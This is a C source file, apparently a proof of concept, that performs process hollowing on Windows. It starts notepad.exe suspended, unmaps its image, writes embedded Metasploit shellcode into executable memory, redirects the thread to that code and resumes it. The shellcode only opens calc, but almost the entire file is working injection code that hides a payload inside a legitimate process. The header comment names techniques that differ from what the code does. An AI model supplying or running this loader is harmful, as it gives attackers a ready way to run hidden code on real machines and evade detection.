/*process doppelganing or local stompping*/

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

// Metasploit x64 calc shellcode
unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

BOOL LocalStomping(IN LPWSTR lpTargetPath, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    DWORD dwReturnLength = 0;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    LPVOID pImageBase = NULL;
    SIZE_T sBytesWritten = 0;

    // Load NTDLL functions
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtUnmapViewOfSection || !NtQueryInformationProcess) {
        printf("[!] Failed to get NTDLL functions\n");
        return FALSE;
    }

    // Create suspended process
    if (!CreateProcessW(lpTargetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] CreateProcess failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process created in suspended state: PID %d\n", pi.dwProcessId);

    // Get process context
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // Get PEB address
    if (NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &dwReturnLength) != 0) {
        printf("[!] NtQueryInformationProcess failed\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // Read PEB to get image base
    LPVOID pRemoteImageBase = NULL;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress), 
                          &pRemoteImageBase, sizeof(pRemoteImageBase), NULL)) {
        printf("[!] ReadProcessMemory failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    printf("[+] Original ImageBase: 0x%p\n", pRemoteImageBase);

    // Unmap original executable
    if (NtUnmapViewOfSection(pi.hProcess, pRemoteImageBase) != 0) {
        printf("[!] NtUnmapViewOfSection failed\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    printf("[+] Original image unmapped\n");

    // Allocate memory for payload at preferred base address
    LPVOID pAllocatedMemory = VirtualAllocEx(pi.hProcess, pRemoteImageBase, sPayloadSize, 
                                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedMemory) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    printf("[+] Memory allocated at: 0x%p\n", pAllocatedMemory);

    // Write payload to allocated memory
    if (!WriteProcessMemory(pi.hProcess, pAllocatedMemory, pPayload, sPayloadSize, &sBytesWritten)) {
        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    printf("[+] Payload written (%zu bytes)\n", sBytesWritten);

    // Update PEB ImageBaseAddress
    if (!WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress), 
                          &pAllocatedMemory, sizeof(pAllocatedMemory), NULL)) {
        printf("[!] Failed to update PEB: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // Set entry point to payload
#ifdef _WIN64
    ctx.Rcx = (DWORD64)pAllocatedMemory;
#else
    ctx.Eax = (DWORD)pAllocatedMemory;
#endif

    // Update thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // Resume execution
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[!] ResumeThread failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    printf("[+] Thread resumed - payload executing!\n");

    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

int main() {
    printf("[#] Local Stomping POC - Process Hollowing\n");
    printf("[#] Target: notepad.exe\n");
    printf("[#] Payload: calc.exe shellcode\n\n");

    printf("[#] Press <Enter> to execute...");
    getchar();

    // Use a legitimate Windows executable as the target
    WCHAR wszTargetPath[MAX_PATH];
    if (GetSystemDirectoryW(wszTargetPath, MAX_PATH) == 0) {
        printf("[!] Failed to get system directory\n");
        return -1;
    }
    wcscat_s(wszTargetPath, MAX_PATH, L"\\notepad.exe");

    if (!LocalStomping(wszTargetPath, Payload, sizeof(Payload))) {
        printf("[!] Local stomping failed!\n");
        return -1;
    }

    printf("[+] Local stomping completed successfully!\n");
    printf("[#] Press <Enter> to exit...");
    getchar();

    return 0;
}
